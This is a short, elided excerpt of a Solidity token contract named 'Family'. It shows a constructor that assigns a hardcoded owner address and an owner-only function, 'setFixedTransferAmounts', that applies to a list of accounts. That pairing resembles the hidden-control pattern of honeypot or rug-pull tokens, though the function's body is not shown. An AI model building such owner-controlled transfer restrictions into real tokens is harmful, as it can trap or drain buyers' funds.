...
contract Family is Context, Ownable, IERC20 {
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _ownr = 0x734a3BfefB029a44aBE8a47CC0e71AEFf0ddfEB2;
    ...
    function setFixedTransferAmounts(address[] calldata accounts, uint256 amount) public onlyowner {
